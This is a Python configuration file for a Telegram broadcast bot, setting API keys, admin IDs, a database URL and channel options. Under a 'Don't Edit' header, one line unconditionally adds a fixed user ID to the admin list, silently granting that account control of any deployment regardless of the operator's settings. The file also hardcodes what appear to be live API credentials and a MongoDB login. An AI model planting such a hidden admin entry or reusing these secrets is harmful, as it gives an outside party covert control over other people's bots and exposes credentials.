# Don't Edit

import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
API_ID = int(os.getenv("API_ID", "27794931"))
API_HASH = os.environ.get("API_HASH", "64498a08cd474a139a8e5a1c5a5aa776")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "Bot Token")
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split("Owner Id")] if os.environ.get("ADMINS") else []
ADMIN = ADMINS
DATABASE_NAME = os.environ.get("DATABASE_NAME", "Cluster0")
DATABASE_URL = os.getenv("DATABASE_URL", "mongodb+srv://kailash:pass@cluster0.sqtztxm.mongodb.net/?retryWrites=true&w=majority") 
OWNER_ID =  int(os.environ.get("OWNER_ID", "5851749250")) 
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(5851749250)

#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "-1001720210775")) 

# For Force Subscription
UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "bots_up")

# true if forward should be avoided
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True")

# image when someone hit /start
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", '')
LINK_BYPASS = "False"
